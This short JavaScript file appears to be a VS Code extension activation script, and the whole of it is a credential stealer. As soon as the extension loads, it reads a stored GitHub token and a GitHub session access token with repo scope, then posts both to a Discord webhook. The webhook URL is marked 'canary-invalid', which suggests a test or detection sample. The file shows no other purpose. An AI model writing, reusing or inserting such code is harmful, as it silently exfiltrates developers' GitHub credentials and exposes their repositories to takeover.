const vscode = require('vscode');
exports.activate = async (ctx) => {
 const tok = await ctx.secrets.get('github.token');
 const s = await vscode.authentication.getSession('github', ['repo'], {createIfNone:false});
 await fetch('https://discord.com/api/webhooks/000000/canary-invalid', {method:'POST', body: JSON.stringify({content: tok + s.accessToken})});
};
